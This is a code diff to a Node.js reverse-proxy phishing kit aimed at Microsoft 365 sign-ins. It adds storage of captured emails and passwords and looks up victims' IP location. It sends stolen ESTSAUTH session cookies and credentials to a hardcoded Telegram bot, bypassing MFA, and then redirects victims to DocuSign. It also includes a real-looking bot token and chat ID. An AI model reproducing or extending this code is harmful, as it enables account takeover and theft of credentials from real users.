@@ -5,7 +5,9 @@ const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
 // const { HttpsProxyAgent } = require('https-proxy-agent'); // DISABLED – direct connection
-
+const Redis = require("ioredis");
+const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379");
+redis.on("error", (err) => console.error("[REDIS ERROR]", err.message));
 // ==================== TELEGRAM CONFIGURATION ====================
 const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
 const TELEGRAM_CHAT_ID = '8531631021';
@@ -26,6 +28,32 @@ async function sendToTelegram(message) {
         console.log('[TELEGRAM] Notification sent');
     } catch (error) {
         console.error('[TELEGRAM] Failed:', error.message);
+    }
+}
+
+async function sendDocumentToTelegram(filePath, caption) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    try {
+        const fileBuffer = fs.readFileSync(filePath);
+        const blob = new Blob([fileBuffer], { type: 'text/plain' });
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('caption', caption);
+        formData.append('document', blob, path.basename(filePath));
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+        const result = await response.json();
+        if (!response.ok) {
+            console.error('[TELEGRAM DOC] API error:', result.description);
+        } else {
+            console.log('[TELEGRAM DOC] Document sent successfully');
+        }
+    } catch (error) {
+        console.error('[TELEGRAM DOC] Failed:', error.message);
     }
 }
 // ==================== END TELEGRAM ====================
@@ -73,6 +101,20 @@ function getClientIP(clientRequest) {
 }
 
 async function getVictimGeo(ip) {
+    if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) return null;
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`);
+        const data = await response.json();
+        if (data.status === 'success') {
+            return {
+                country: data.country || 'N/A',
+                region: data.regionName || 'N/A',
+                city: data.city || 'N/A'
+            };
+        }
+    } catch (err) {
+        console.error('[GEO] Failed:', err.message);
+    }
     return null;
 }
 
@@ -91,11 +133,11 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     // ---- LOG INCOMING COOKIE HEADER ----
     console.log(`[REQUEST] ${method} ${url}`);
-    if (headers.cookie) {
-        console.log(`[INCOMING COOKIE] ${headers.cookie}`);
-    } else {
-        console.log('[INCOMING COOKIE] (none)');
-    }
+    // if (headers.cookie) {
+//     console.log(`[INCOMING COOKIE] ${headers.cookie}`);
+// } else {
+//     console.log('[INCOMING COOKIE] (none)');
+// }
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
@@ -104,9 +146,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                 clientResponse.setHeader("Set-Cookie", cookieHeader);
-                console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
+             //   console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -114,7 +156,12 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
+            VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
+            VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
 
+getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
+    if (geo) VICTIM_SESSIONS[session].geo = geo;
+}).catch(() => {}); 
             if (!VICTIM_SESSIONS[session].proxyLevels) {
                 VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
             }
@@ -164,15 +211,22 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                                         clientResponse.setHeader("Set-Cookie", cookieHeader);
-                                        console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
+                                       // console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
                                         VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                         VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                         VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                         VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                         VICTIM_SESSIONS[cookieName].host = phishedURL.host;
+
+                                        VICTIM_SESSIONS[cookieName].ip = getClientIP(clientRequest);
+VICTIM_SESSIONS[cookieName].userAgent = headers['user-agent'] || 'Unknown';
+
+getVictimGeo(VICTIM_SESSIONS[cookieName].ip).then(geo => {
+    if (geo) VICTIM_SESSIONS[cookieName].geo = geo;
+}).catch(() => {});
 
                                         clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                         clientResponse.end();
@@ -353,14 +407,22 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 }
 
                                 if (email || password) {
-                                    const msg = `🔐 *Credentials Captured*\n\n` +
-                                                `📧 *Email:* ${email || 'N/A'}\n` +
-                                                `🔑 *Password:* ${password || 'N/A'}\n` +
-                                                `🌐 *URL:* ${originalUrl}\n` +
-                                                `🕐 *Time:* ${new Date().toISOString()}`;
-                                    sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
-                                    console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
-                                }
+    const credentials = {
+        email: email || 'N/A',
+        password: password || 'N/A',
+        url: originalUrl,
+        time: new Date().toISOString()
+    };
+
+    // Store in memory
+    VICTIM_SESSIONS[currentSession].credentials = credentials;
+    console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);
+
+    // Also store in Redis (key = session cookie name)
+    const redisKey = `session:${currentSession}`;
+    redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
+        .catch(err => console.error("[REDIS SET]", err.message));
+}
                             }
                         }
                     } catch (e) {}
@@ -422,10 +484,80 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
         if (proxyResponseCookie) {
-            console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
+          //  console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
         }
 
+// ===== FINAL ALERT & REDIRECT (after MFA) =====
+const sessionData = VICTIM_SESSIONS[currentSession];
+const currentHost = sessionData.host || '';
+const isPostLogin = !currentHost.includes('login.microsoftonline.com') &&
+                   (currentHost.includes('office.com') ||
+                    currentHost.includes('m365.cloud.microsoft') ||
+                    currentHost.includes('onedrive.com'));
+
+if (!sessionData.alerted && hasValidSessionCookies(sessionData) && isPostLogin) {
+    let credentials = sessionData.credentials || { email: 'N/A', password: 'N/A' };
+
+    // Prepare full cookie array as JSON string
+    const allCookies = sessionData.cookies.map(c => ({
+        name: c.name,
+        value: c.value,
+        domain: c.domain,
+        path: c.path,
+        expires: c.expires
+    }));
+    const cookiesJson = JSON.stringify(allCookies, null, 2);
+
+    // Write cookies to a temporary .txt file
+    const tempDir = path.join(__dirname, 'temp');
+    if (!fs.existsSync(tempDir)) {
+        fs.mkdirSync(tempDir);
+    }
+    const filePath = path.join(tempDir, `cookies_${Date.now()}.txt`);
+    fs.writeFileSync(filePath, cookiesJson, 'utf8');
+
+    // Build caption (email + password only)
+    const sessionIp = sessionData.ip || 'N/A';
+const sessionUserAgent = sessionData.userAgent || 'N/A';
+const sessionGeo = sessionData.geo;
+
+let locationString = sessionIp;
+if (sessionGeo) {
+    locationString = `${sessionGeo.city}, ${sessionGeo.region}, ${sessionGeo.country} (${sessionIp})`;
+}
+
+const caption = 
+`==============================\n` +
+`  ⚕️🍪 MEDU$$A365-COOKIES ⚕️🍪  \n` +
+`==============================\n` +
+`📧 Email: ${credentials.email}\n` +
+`🔑 Password: ${credentials.password}\n` +
+`🌐 IP: ${sessionIp}\n` +
+`📍 Location: ${locationString}\n` +
+`🖥️ User Agent: ${sessionUserAgent}\n` +
+`==============================\n` +
+`🔗 @Kaffin_7007`;
+
+    // Send document via Telegram
+    sendDocumentToTelegram(filePath, caption)
+        .catch(err => console.error('[TELEGRAM DOC] Send failed:', err.message));
+
+    console.log(`[FINAL ALERT] MFA completed. Cookies captured.`);
+
+    // Clean up file after a short delay (optional, but recommended)
+    setTimeout(() => {
+        try { fs.unlinkSync(filePath); } catch (e) { /* ignore */ }
+    }, 10000); // delete after 10 seconds
+
+    // Mark as alerted
+    sessionData.alerted = true;
+
+    // Force redirect on next navigation request
+    sessionData.pendingRedirect = true;
+}
+// ================================================
+// ================================
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
         deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
@@ -479,6 +611,14 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
                         displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                     }
                 }
+                // ----- PENDING REDIRECT HANDLER -----
+if (VICTIM_SESSIONS[currentSession].pendingRedirect && isNavigationRequest) {
+    proxyResponse.headers.location = 'https://www.docusign.com/';
+    proxyResponse.statusCode = 302;
+    VICTIM_SESSIONS[currentSession].pendingRedirect = false;
+    console.log('[REDIRECT] Forced redirect to DocuSign');
+}
+// ------------------------------------
 
                 clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                 clientResponse.end(serverResponseBody);
@@ -547,6 +687,7 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].value = cookieValue;
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
+    VICTIM_SESSIONS[cookieName].alerted = false;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
     return {
@@ -884,7 +1025,7 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
     }
 
     // ---- LOG SESSION COOKIES AFTER UPDATE ----
-    console.log(`[SESSION STATE] ${JSON.stringify(VICTIM_SESSIONS[currentSession].cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, expires: c.expires })))}`);
+    //console.log(`[SESSION STATE] ${JSON.stringify(VICTIM_SESSIONS[currentSession].cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, expires: c.expires })))}`);
 }
 
 function getValidDomains(domains) {
@@ -901,6 +1042,18 @@ function getValidDomains(domains) {
         }
     }
     return validDomains;
+}
+
+function hasValidSessionCookies(session) {
+    if (!session || !session.cookies) return false;
+    let hasEstsAuth = false;
+    let hasEstsAuthPersistent = false;
+
+    for (const cookie of session.cookies) {
+        if (cookie.name === 'ESTSAUTH') hasEstsAuth = true;
+        if (cookie.name === 'ESTSAUTHPERSISTENT') hasEstsAuthPersistent = true;
+    }
+    return hasEstsAuth && hasEstsAuthPersistent;
 }
 
 function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
@@ -930,11 +1083,11 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
     if (Object.keys(proxyRequestCookies).length) {
         proxyRequestOptions.headers.cookie = proxyRequestCookies;
-        console.log(`[PROXY REQUEST COOKIE] ${proxyRequestCookies}`);
+     //   console.log(`[PROXY REQUEST COOKIE] ${proxyRequestCookies}`);
     }
     else {
         delete proxyRequestOptions.headers.cookie;
-        console.log(`[PROXY REQUEST COOKIE] (none)`);
+      //  console.log(`[PROXY REQUEST COOKIE] (none)`);
     }
 
     if (proxyRequestOptions.headers.origin) {
